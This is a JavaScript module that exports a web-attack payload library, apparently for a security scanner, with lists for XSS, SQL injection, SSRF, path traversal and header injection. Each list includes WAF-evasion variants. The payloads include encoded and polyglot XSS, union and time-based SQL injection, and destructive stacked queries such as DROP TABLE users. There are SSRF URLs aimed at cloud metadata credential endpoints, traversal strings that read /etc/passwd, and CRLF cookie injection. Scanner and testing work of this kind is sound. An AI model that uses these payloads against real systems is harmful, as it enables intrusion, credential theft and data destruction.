// Shannon-Aligned Payload Library
// Categories: XSS, SQLi, SSRF, Path Traversal, Header Injection
// Each category includes WAF-evasion variants

const PAYLOADS = {
    xss: [
        // Basic
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><svg/onload=alert(1)>',
        "'-alert(1)-'",
        '<details open ontoggle=alert(1)>',
        // Encoding Evasion
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<svg onload=eval(atob("YWxlcnQoMSk="))>',
        '"><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        // Case & Comment Evasion
        '<ScRiPt>alert(1)</ScRiPt>',
        '<img src=x onerror="al"+"ert(1)">',
        '<!--><svg onload=alert(1)>',
        // DOM XSS Triggers
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '"><iframe src="javascript:alert(1)">',
        // Event Handlers
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        // Polyglot
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    ],

    sqli: [
        // Classic
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        // Union-Based
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        // Error-Based
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
        // Time-Based Blind
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "' AND pg_sleep(5)--",
        "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        // WAF Evasion
        "' /*!OR*/ '1'='1",
        "' %4fR '1'='1",
        "'/**/OR/**/1=1--",
        "' OR 1=1-- -",
        "' oR '1'='1' --",
        // Stacked Queries
        "'; DROP TABLE users;--",
        "'; INSERT INTO users VALUES('hacked','hacked');--",
    ],

    ssrf: [
        // Localhost Variants
        'http://127.0.0.1',
        'http://127.0.0.1:80',
        'http://127.0.0.1:443',
        'http://127.0.0.1:8080',
        'http://localhost',
        'http://0.0.0.0',
        'http://0',
        // IPv6
        'http://[::1]',
        'http://[::1]:80',
        'http://[0000::1]',
        // Cloud Metadata
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.170.2/v2/credentials',
        // DNS Rebinding / Bypass
        'http://127.1',
        'http://2130706433', // 127.0.0.1 as integer
        'http://017700000001', // 127.0.0.1 as octal
        'http://0x7f000001', // 127.0.0.1 as hex
        // Protocol Smuggling
        'gopher://127.0.0.1:25/',
        'file:///etc/passwd',
        'dict://127.0.0.1:11211/',
    ],

    path_traversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '....\\\\....\\\\....\\\\etc\\\\passwd',
        '/etc/passwd%00.jpg',
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
    ],

    header_injection: [
        // CRLF Injection
        '%0d%0aSet-Cookie:pwned=true',
        '%0d%0aX-Injected:true',
        '\\r\\nX-Injected: true',
        // Host Header Injection
        'evil.com',
        '127.0.0.1',
        'localhost\\@evil.com',
        // X-Forwarded-For spoofing
        '127.0.0.1',
        '::1',
        '10.0.0.1',
    ]
};

module.exports = PAYLOADS;
